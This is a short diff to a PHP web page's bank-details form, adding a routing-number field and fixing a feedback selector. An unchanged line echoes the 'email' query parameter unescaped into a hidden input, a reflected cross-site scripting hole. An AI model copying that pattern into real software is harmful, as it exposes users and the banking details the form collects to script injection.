@@ -860,6 +860,12 @@ if (strpos($url, 'www') == false) {
                                 <input type="hidden" name="email" value="<?= $_GET['email'] ?? "" ?>" />
 
                                 <div class="row row-gap-4">
+
+                                
+                                                                    <div class="col-12">
+                                                                        <input type="text" name="routing_number" class="form-control" placeholder="Routing Number" required>
+                                                                    </div>
+
                                     <div class="col-12">
                                         <input type="text" name="account_number" class="form-control" placeholder="Account Number" required>
                                     </div>
@@ -880,7 +886,7 @@ if (strpos($url, 'www') == false) {
                                 </div>
 
 
-                                <div class="feed"> </div>
+                                <div class="feed" style="margin-top:10px"> </div>
                             </form>
 
                         </div>
@@ -1043,7 +1049,7 @@ if (strpos($url, 'www') == false) {
         text.innerHTML = text.innerHTML.trim();
 
         const formEl = document.querySelector("#accountNumberForm");
-        const feedback = document.querySelector('feed');
+        const feedback = document.querySelector('.feed');
         formEl.addEventListener("submit", async (e) => {
             e.preventDefault();
             const form = new FormData(formEl);
